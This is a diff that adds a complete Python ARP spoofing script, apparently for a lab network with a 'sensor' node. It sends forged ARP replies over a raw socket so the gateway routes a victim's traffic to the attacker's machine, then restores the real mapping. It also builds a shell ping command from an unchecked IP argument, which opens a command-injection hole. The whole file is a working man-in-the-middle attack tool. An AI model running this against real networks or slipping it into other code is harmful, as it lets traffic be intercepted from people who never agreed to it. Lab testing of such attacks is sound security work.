@@ -1,0 +1,48 @@
+#!/usr/bin/env python3
+"""ARP spoofing (man in the middle): tell the gateway "the sensor's IP is at MY MAC address".
+
+Sends one fake ARP reply per second, ONLY to the gateway (unicast), then puts the correct address back.
+No extra tools needed (raw socket). Usage: arp_spoof [victim_ip] [seconds]   (default: node1, 10 s)
+"""
+import os
+import socket
+import struct
+import sys
+import time
+
+VICTIM = sys.argv[1] if len(sys.argv) > 1 else "172.30.0.21"
+SECONDS = float(sys.argv[2]) if len(sys.argv) > 2 else 10
+GATEWAY = os.environ.get("TARGET", "172.30.0.10")
+
+
+def mac_of(ip):
+    """Ping once, then read the MAC from our ARP table."""
+    os.system(f"ping -c 1 -W 1 {ip} >/dev/null 2>&1")
+    for line in open("/proc/net/arp").readlines()[1:]:
+        parts = line.split()
+        if parts[0] == ip and parts[3] != "00:00:00:00:00:00":
+            return bytes.fromhex(parts[3].replace(":", ""))
+    sys.exit(f"cannot find the MAC of {ip}")
+
+
+def arp_reply(claimed_ip, claimed_mac, to_ip, to_mac, from_mac):
+    ethernet = to_mac + from_mac + b"\x08\x06"
+    arp = struct.pack("!HHBBH6s4s6s4s", 1, 0x0800, 6, 4, 2,          # Ethernet/IPv4, operation 2 = reply
+                      claimed_mac, socket.inet_aton(claimed_ip), to_mac, socket.inet_aton(to_ip))
+    return ethernet + arp
+
+
+sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+sock.bind(("eth0", 0))
+my_mac = sock.getsockname()[4]
+gateway_mac, victim_mac = mac_of(GATEWAY), mac_of(VICTIM)
+print(f"ARP spoofing: telling {GATEWAY} that {VICTIM} is at {my_mac.hex(':')} (real: {victim_mac.hex(':')}) for {SECONDS:.0f} s")
+end = time.time() + SECONDS
+sent = 0
+while time.time() < end:
+    sock.send(arp_reply(VICTIM, my_mac, GATEWAY, gateway_mac, my_mac))
+    sent += 1
+    time.sleep(1)
+for _ in range(3):                                                    # clean up: the true address again
+    sock.send(arp_reply(VICTIM, victim_mac, GATEWAY, gateway_mac, victim_mac))
+print(f"done: {sent} fake ARP replies sent, correct address restored")
